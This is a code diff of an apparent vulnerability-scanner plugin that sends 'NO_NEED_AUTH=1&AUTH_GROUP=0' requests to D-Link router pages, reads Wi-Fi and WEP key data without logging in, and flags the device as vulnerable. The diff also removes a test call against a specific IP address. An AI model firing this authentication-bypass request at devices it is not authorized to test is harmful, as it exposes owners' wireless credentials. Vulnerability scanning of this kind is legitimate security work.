@@ -17,16 +17,17 @@ def assign(service, arg):
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 
 def audit(arg):
-    
+
     payload = (
         'bsc_wlan.php?NO_NEED_AUTH=1&AUTH_GROUP=0',
         'st_device.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
         )
     url1 = arg + payload[0]
-    
+
     code, head,res, errcode, _ = curl.curl2(url1)
     if  code==200 and 'Wi-Fi Protected' in res and 'WEP Key' in res:
         security_hole(url1)
+        return arg
 
     url2 = arg + payload[1]
     code, head,res, errcode, _ = curl.curl2(url2)
@@ -34,6 +35,7 @@ def audit(arg):
         security_hole(url2)
 
 
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('d-link', 'http://222.121.54.176/')[1])
